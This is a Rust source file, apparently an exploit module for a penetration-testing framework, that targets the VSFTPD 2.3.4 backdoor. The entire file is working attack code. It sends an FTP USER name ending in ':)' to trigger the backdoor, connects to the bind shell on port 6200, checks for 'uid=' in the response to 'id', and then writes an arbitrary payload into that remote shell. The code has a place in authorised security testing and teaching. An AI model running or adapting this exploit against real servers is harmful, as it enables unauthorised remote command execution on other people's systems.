use crate::{
    core::{
        exploit::{remote_tcp, remote_tcp::RemoteTcp, Exploit, Info, Kind, Ranking},
        opt::Opt,
        payload::Payload,
    },
    util::gen::random_alphanumeric,
};
use log::info;
use std::{
    error::Error,
    io::{BufRead, BufReader, Write},
    net::TcpStream,
    thread,
    time::Duration,
};

pub struct Vsftpd234Backdoor {
    pub remote_tcp: RemoteTcp,
    pub backdoor_port: Option<String>,
}

impl Vsftpd234Backdoor {
    pub fn new(remote_tcp: RemoteTcp, backdoor_port: Option<String>) -> Vsftpd234Backdoor {
        Vsftpd234Backdoor {
            remote_tcp,
            backdoor_port,
        }
    }

    fn handle_backdoor(
        &self,
        mut stream: TcpStream,
        mut stream_buf: BufReader<TcpStream>,
        payload: Box<dyn Payload + Send + Sync>,
    ) -> Result<(), Box<dyn Error>> {
        stream.write("id\n".as_bytes())?;

        let mut backdoor_resp = String::new();
        stream_buf.read_line(&mut backdoor_resp)?;

        if !backdoor_resp.contains("uid=") {
            return Err("The backdoor port seems to not be a shell".into());
        }
        info!(
            "Received successful backdoor UID response: {}",
            backdoor_resp.trim()
        );

        let blob_string = &payload.blob_to_string()?;
        let mut handle = None;
        if payload.needs_pretask() {
            handle = Some(thread::spawn(move || -> Result<(), String> {
                payload.pretask().map_err(|e| format!("{}", e))
            }));
        }
        thread::sleep(Duration::from_millis(50));

        info!("Writing payload to backdoor stream: {}", blob_string);
        stream.write(format!("{}\n", blob_string).as_bytes())?;

        if let Some(handle) = handle {
            handle
                .join()
                .map_err(|e| format!("Failure in pretask thread: {:?}", e))??;
        }

        Ok(())
    }

    fn attempt_backdoor(
        &self,
        payload: Box<dyn Payload + Send + Sync>,
        expected_open: bool,
    ) -> Result<(), Box<dyn Error>> {
        // NOTE: for now hardcoding a 1 second sleep because without it the backdoor may not be open in time for the request
        thread::sleep(Duration::from_secs(1));

        let backdoor_port = match &self.backdoor_port {
            Some(backdoor_port) => backdoor_port,
            None => "6200",
        };
        info!("Attempting to access backdoor on port {}", backdoor_port);
        match self.remote_tcp.custom_connect(
            &self
                .remote_tcp
                .rhost
                .clone()
                .ok_or("RHOST value must be set")?,
            backdoor_port,
        ) {
            Ok(stream) => {
                info!(
                    "Port {} used by the backdoor bind listener is open",
                    backdoor_port
                );
                let stream_buf = BufReader::new(stream.try_clone()?);
                self.handle_backdoor(stream, stream_buf, payload)?;
                return Ok(());
            }
            Err(e) => {
                if !expected_open {
                    info!(
                        "Port {} used by backdoor bind listener is not already open: {}",
                        backdoor_port, e
                    );
                } else {
                    return Err(format!(
                        "Port {} used by backdoor bind listener is not open: {}",
                        backdoor_port, e,
                    )
                    .into());
                }
            }
        };
        Ok(())
    }
}

impl Exploit for Vsftpd234Backdoor {
    fn default() -> Self {
        Vsftpd234Backdoor {
            remote_tcp: RemoteTcp::default(),
            backdoor_port: None,
        }
    }

    fn kind(&self) -> Kind {
        Kind::Remote
    }

    fn ranking(&self) -> Ranking {
        Ranking::Excellent
    }

    fn info(&self) -> Info {
        Info {
            descriptive_name: "VSFTPD v2.3.4 Backdoor Command Execution".to_string(),
            module_path: "exploit/ftp/vsftpd_234_backdoor".to_string(),
            disclosure_date: "2011-07-03".to_string(),
            ranking: self.ranking().to_string(),
            kind: self.kind().to_string(),
            description:
                "This module exploits a malicious backdoor that was added to the VSFTPD download \
        archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between \
        June 30th 2011 and July 1st 2011 according to the most recent information \
        available. This backdoor was removed on July 3rd 2011."
                    .to_string(),
            license: None,
            author: Some(vec!["hdm".to_string(), "MC".to_string()]),
            references: None,
            platform: Some(vec!["unix".to_string()]),
        }
    }

    fn exploit(
        &self,
        payload: &Box<dyn Payload + Send + Sync>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        self.attempt_backdoor(payload.clone(), false)?;

        let mut stream = self.remote_tcp.connect()?;
        let mut stream_buf = BufReader::new(stream.try_clone()?);

        let mut banner_resp = String::new();
        stream_buf.read_line(&mut banner_resp)?;
        info!("Banner returned from server: {}", banner_resp);

        let user_hash = random_alphanumeric(6);
        stream.write(format!("USER {}:)\r\n", user_hash).as_bytes())?;
        let mut user_hash_resp = String::new();
        stream_buf.read_line(&mut user_hash_resp)?;
        info!("Response to user hash: {}", user_hash_resp);

        if user_hash_resp.contains("530") {
            return Err(
                "Server is configured for anonymous only and the backdoor code cannot be reached"
                    .into(),
            );
        }

        if !user_hash_resp.contains("331") {
            return Err(
                "Server is not responding as expected, response should contain 331 code".into(),
            );
        }

        stream.write(format!("PASS {}\r\n", user_hash).as_bytes())?;

        // Attempt the backdoor after exploitation, it is expected to be open now
        self.attempt_backdoor(payload.clone(), true)?;
        Ok(())
    }

    fn opts(&self) -> Vec<Opt> {
        let mut opts: Vec<Opt> = Vec::new();

        let mut remote_tcp_opts = RemoteTcp::opts();
        for remote_tcp_opt in remote_tcp_opts.iter_mut() {
            if remote_tcp_opt.name == "RPORT" {
                remote_tcp_opt.default_value = Some("21".to_string());
                remote_tcp_opt.value = Some("21".to_string());
            }
        }
        opts.append(&mut remote_tcp_opts);

        opts.push(Opt {
            name: "BACKDOOR_PORT".to_string(),
            description: "Backdoor port that the vulnerable VSFTPD server can open".to_string(),
            default_value: Some("6200".to_string()),
            value: Some("6200".to_string()),
        });
        opts
    }

    fn apply_opts(&mut self, opts: Vec<Opt>) -> Result<(), Box<dyn Error>> {
        for opt in opts.clone() {
            match opt.name.as_str() {
                "BACKDOOR_PORT" => self.backdoor_port = opt.value,
                _ => info!("Unknown option name {} was provided", opt.name),
            }
        }
        remote_tcp::apply_opts!(self, opts);
        Ok(())
    }
}
